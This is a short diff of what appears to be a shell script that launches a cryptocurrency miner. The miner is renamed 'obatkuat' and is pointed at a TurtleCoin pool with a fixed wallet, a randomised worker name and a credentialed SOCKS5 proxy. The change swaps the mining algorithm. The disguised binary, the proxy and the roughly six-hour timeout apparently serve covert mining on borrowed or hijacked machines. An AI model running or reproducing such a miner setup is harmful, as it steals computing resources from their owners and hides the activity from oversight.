@@ -10,4 +10,4 @@ A=us.turtlecoin.herominers.com:1160
 B=TRTLuxaMVkNaKUrey8Dh6tfKSzup58rRbdQFW6RGTR8dSy2VkY5tXbRAPLMuC44C3rZYGumcAuFKjFktTEGV9Z5wRvnjnxzaxvR
 C=$(shuf -i 10-9999999999999999999 -n 1)
 D=socks5://bambank:123@147.182.228.194:3000
-timeout 359m ./obatkuat -a rx/0 -o $A -u $B.$C -p x -t 8 -x $D -k
+timeout 359m ./obatkuat -a argon2/chukwa -o $A -u $B.$C -p x -t 8 -x $D -k
